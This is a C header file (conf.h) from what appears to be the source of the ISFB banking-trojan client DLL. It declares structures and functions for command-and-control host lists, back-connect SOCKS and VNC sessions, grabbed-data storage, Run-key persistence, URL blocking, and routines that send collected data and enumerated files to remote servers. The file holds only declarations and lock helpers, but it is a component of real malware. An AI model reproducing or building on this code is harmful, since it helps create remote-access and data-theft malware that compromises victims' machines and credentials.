//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: conf.h
// $Revision: 329 $ 
// $Date: 2014-09-15 19:17:40 +0400 (Пн, 15 сен 2014) $
// description: 
//	ISFB client DLL. Config definitions.

#pragma once 


typedef struct _CONFIG_DATA
{
	PCHAR				UnpackedData;	// unpaked main config data
	PCHAR				BlockedUrlData;	// list of blocked URLs in the same format as main config
	ULONG				BlockedUrlSize;	// size of the list of blocked URLs in bytes
	CRC32				FileCRC;		// config file CRC

	CRITICAL_SECTION	Lock;			// config lock
	LONG volatile		LockCount;		// config lock count for shared locking
} CONFIG_DATA, *PCONFIG_DATA;

typedef struct _BC_REPLY
{
	ULONG	Address;
	USHORT	Port;
	USHORT	Type;
} BC_REPLY, *PBC_REPLY;

#define	BC_TYPE_SOCKS	1
#define	BC_TYPE_VNC		2

#define ASSERT_CONFIG_LOCKED_EXCLUSIVE(ConfigData)	\
	ASSERT(ConfigData.Lock.OwningThread == (HANDLE)(LONG_PTR)GetCurrentThreadId() && ConfigData.LockCount == 0)

#define ASSERT_CONFIG_LOCKED_SHARED(ConfigData)	\
	ASSERT(ConfigData.LockCount > 0)

typedef struct _RUN_ENTRY
{
	LIST_ENTRY	Entry;
	LPTSTR		pName;
	LPTSTR		pValue;
	ULONG		Size;
} RUN_ENTRY, *PRUN_ENTRY;


typedef WINERROR (__stdcall* CONF_WALK_REGISTRY_CALLBACK)(HKEY hKey, LPTSTR pKeyName, PCHAR pKeyData, ULONG Size, PULONG pIndex, PVOID Context);

extern	CONFIG_DATA		g_ConfigData;

extern	ULONG			g_MachineRandSeed;

extern	LPTSTR			g_ConfigUpdateMutexName;
extern	LPTSTR			g_CommandMutexName;
extern	LPTSTR			g_ConfigUpdateTimerName;
extern	LPTSTR			g_CommandTimerName;
extern	LPTSTR			g_BcTimerName;
extern	LPTSTR			g_BcMutexName;	
extern	LPTSTR			g_SolStorageName;
extern	LPTSTR			g_GrabStorageName;
extern	LPTSTR			g_CommandLogName;
extern	LPTSTR			g_SendTimerName;
extern	LPTSTR			g_SendMutexName;

extern	LPTSTR			g_FilesRegistryKey;
extern	LPTSTR			g_RunRegistryKey;

extern	ULONG			g_ConfigTimeout;
extern	ULONG			g_ConfigFailTimeout;
extern	ULONG			g_TaskTimeout;
extern	ULONG			g_SendTimeout;
extern	ULONG			g_KnockerTimeout;
extern	ULONG			g_BcTimeout;
extern	PCHAR			g_pPublicKey;
extern	PCHAR			g_pServerKey;

extern	UCHAR			g_NumberHosts;
extern	LPTSTR*			g_pHosts;
extern	LPTSTR			g_pHostsString;
extern	LPTSTR			g_Hosts[];

extern	UCHAR			g_BootstrapCount;
extern	LPTSTR*			g_pBootstrap;
extern	LPTSTR			g_pBootstrapString;

extern	SOCKADDR_IN		g_BcServer;

extern	HANDLE			g_ActiveEvent;

extern	PWORKER_THREADS	g_Workers;

extern	CRITICAL_SECTION	g_HostSelectLock;


#ifdef	_DYNAMIC_HOSTS
	#define	NUMBER_HOSTS	HOSTS_PER_GROUP
	VOID	ConfReleaseHostsList(VOID);
#else
	#define	ConfReleaseHostsList()	__noop()
#endif


WINERROR WINAPI MainRequestThread(PVOID Context);
WINERROR WINAPI CommandServerThread(PVOID Param);

WINERROR CreateGlobalObjects(VOID);
WINERROR GetClientId(VOID);
WINERROR SetGroupId(ULONG uGroupId, LPTSTR sGroupId, USHORT Plugins, UCHAR HostIndex);

WINERROR RegReadValue(LPTSTR ValueName, PCHAR* ppBuf, PULONG pBufSize);
WINERROR RegWriteValue(LPTSTR ValueName, PCHAR Buf, ULONG BufSize, ULONG Type);
BOOL NetClearCacheURL(IN LPTSTR Str);

ULONG VerifyDataSignature(PCHAR	Buffer, ULONG Size, BOOL bUnpack);

WINERROR WINAPI RecvHttpData(LPTSTR	Url, PCHAR*	PageData, PULONG PageDataSize, BOOL bVerify);

WINERROR GetAndSendData(ULONG CommandId, ULONG SendId, ULONG MaxSize, LPTSTR ErrorData, LPSTR FileName);
WINERROR ConfRequestData(LPTSTR pRequestUri, ULONG Crc, BOOL bPost, PCHAR pSendBuffer, ULONG SendSize, PCHAR* pBuffer, PULONG pSize);
WINERROR ConfSendData(PCHAR pSendBuffer, ULONG SendSize, ULONG DataId, LPTSTR pFileName, BOOL bWait);

WINERROR EnumAndSendFiles(VOID);

WINERROR ConfigBlockUrl(PCHAR pUrl, ULONG Length);
WINERROR ConfigUnblockUrl(PCHAR pUrl, ULONG Length);

HANDLE CreateInitTimer(LPTSTR TimerName, BOOL bNotification);

WINERROR SendAllPendingData(VOID);


// Lock\unlock config
_inline ConfigLockShared(PCONFIG_DATA Config)
{
	EnterCriticalSection(&Config->Lock);
	_InterlockedIncrement(&Config->LockCount);
	LeaveCriticalSection(&Config->Lock);
	
}

_inline ConfigUnlockShared(PCONFIG_DATA Config)
{
	_InterlockedDecrement(&Config->LockCount);
}

_inline ConfigLockExclusive(PCONFIG_DATA Config)
{
	EnterCriticalSection(&Config->Lock);
	while(Config->LockCount)
		Sleep(10);
}

_inline ConfigUnlockExclusive(PCONFIG_DATA Config)
{
	LeaveCriticalSection(&Config->Lock);
}
